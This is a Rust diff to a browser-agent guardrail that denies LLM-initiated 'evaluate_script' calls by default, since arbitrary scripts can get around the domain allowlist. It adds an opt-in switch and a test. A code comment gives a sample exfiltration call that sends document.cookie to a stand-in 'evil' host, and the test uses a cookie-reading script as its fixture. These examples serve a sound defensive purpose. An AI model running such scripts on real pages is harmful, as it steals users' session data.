@@ -23,6 +23,12 @@ use crate::llm::types::ToolCall;
 /// Tools whose `url` argument navigates or fetches and must be allowlist-gated.
 const NAVIGATION_TOOLS: &[&str] = &["navigate_page", "new_page"];
 
+/// Tool whose body cannot be statically vetted against the allowlist and is
+/// therefore an unconstrained exfiltration channel (B3): a script can
+/// `fetch('https://evil/', {body: document.cookie})` to any host, bypassing the
+/// navigation allowlist entirely.
+const EVALUATE_SCRIPT_TOOL: &str = "evaluate_script";
+
 /// Deny browser navigation to any host not on an operator allowlist.
 ///
 /// The allowlist holds bare hosts (e.g. `example.com`). A target host matches if
@@ -31,6 +37,7 @@ const NAVIGATION_TOOLS: &[&str] = &["navigate_page", "new_page"];
 /// denies all navigation (deny-by-default).
 pub struct DomainAllowlistGuard {
     allow: HashSet<String>,
+    allow_evaluate_script: bool,
 }
 
 impl DomainAllowlistGuard {
@@ -41,7 +48,22 @@ impl DomainAllowlistGuard {
             .into_iter()
             .map(|h| normalize_host(&h.into()))
             .collect();
-        Self { allow }
+        Self {
+            allow,
+            // B3: deny `evaluate_script` by default — its arbitrary body is an
+            // ungated exfiltration channel that the host allowlist cannot vet.
+            // Internal page-settle / verification code calls the MCP tool
+            // directly (not through this guardrail), so only LLM-initiated
+            // `evaluate_script` calls are affected.
+            allow_evaluate_script: false,
+        }
+    }
+
+    /// Permit LLM-initiated `evaluate_script` despite its exfiltration risk.
+    /// Off by default; enable only when the agent operates on trusted pages.
+    pub fn allow_evaluate_script(mut self, allow: bool) -> Self {
+        self.allow_evaluate_script = allow;
+        self
     }
 
     /// Is `host` allowed (equal to, or a subdomain of, an allowlisted host)?
@@ -123,7 +145,13 @@ impl Guardrail for DomainAllowlistGuard {
         &self,
         call: &ToolCall,
     ) -> Pin<Box<dyn Future<Output = Result<GuardAction, Error>> + Send + '_>> {
-        let action = if NAVIGATION_TOOLS.contains(&call.name.as_str()) {
+        let action = if call.name == EVALUATE_SCRIPT_TOOL && !self.allow_evaluate_script {
+            GuardAction::deny(
+                "evaluate_script denied: an arbitrary script body can exfiltrate page \
+                 data to any host, bypassing the domain allowlist. Enable it explicitly \
+                 (allow_evaluate_script) only when operating on trusted pages.",
+            )
+        } else if NAVIGATION_TOOLS.contains(&call.name.as_str()) {
             match call.input.get("url").and_then(|v| v.as_str()) {
                 // A navigation with a real http(s) host: gate it.
                 Some(url) => match url_host(url) {
@@ -266,6 +294,25 @@ mod tests {
             input: serde_json::json!({ "uid": "1_2" }),
         };
         assert_eq!(decide(&g, &click).await, GuardAction::Allow);
+    }
+
+    #[tokio::test]
+    async fn evaluate_script_denied_by_default_and_opt_in_allows() {
+        // B3: `evaluate_script` is an ungated exfil channel; deny by default.
+        let eval = ToolCall {
+            id: "e1".into(),
+            name: "evaluate_script".into(),
+            input: serde_json::json!({ "function": "() => document.cookie" }),
+        };
+        let g = DomainAllowlistGuard::new(["example.com"]);
+        assert!(
+            decide(&g, &eval).await.is_denied(),
+            "evaluate_script must be denied by default"
+        );
+
+        // Explicit opt-in permits it.
+        let g_opt = DomainAllowlistGuard::new(["example.com"]).allow_evaluate_script(true);
+        assert_eq!(decide(&g_opt, &eval).await, GuardAction::Allow);
     }
 
     #[tokio::test]
